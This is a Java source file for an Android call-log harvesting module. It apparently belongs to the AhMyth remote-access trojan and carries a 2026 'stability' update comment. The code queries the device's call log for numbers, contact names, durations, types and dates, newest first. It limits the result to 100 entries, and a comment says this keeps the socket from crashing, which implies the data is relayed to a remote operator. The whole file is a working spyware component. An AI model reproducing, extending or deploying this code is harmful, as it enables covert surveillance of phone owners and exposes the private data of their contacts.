package ahmyth.mine.king.ahmyth;

import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Updated for Stability and Timestamp Support 2026
 */

public class CallsManager {

    public static JSONObject getCallsLogs(){

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            
            // SORT BY DATE DESC: This puts the newest calls first
            String sortOrder = CallLog.Calls.DATE + " DESC";
            
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, sortOrder);

            if (cur != null) {
                int count = 0;
                // LIMIT TO 100: Prevents the socket from crashing due to large data size
                while (cur.moveToNext() && count < 100) {
                    JSONObject call = new JSONObject();
                    
                    String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cur.getInt(cur.getColumnIndex(CallLog.Calls.TYPE));
                    long date = cur.getLong(cur.getColumnIndex(CallLog.Calls.DATE));

                    call.put("phoneNo", num != null ? num : "Unknown");
                    call.put("name", name != null ? name : "Unknown");
                    call.put("duration", duration != null ? duration : "0");
                    call.put("type", type);
                    call.put("date", date); 
                    
                    list.put(call);
                    count++;
                }
                cur.close(); 
            }
            
            Calls.put("callsList", list);
            return Calls;
        } catch (Exception e) { // Catch all exceptions to prevent app crash
            e.printStackTrace();
        }
        return null;
    }
}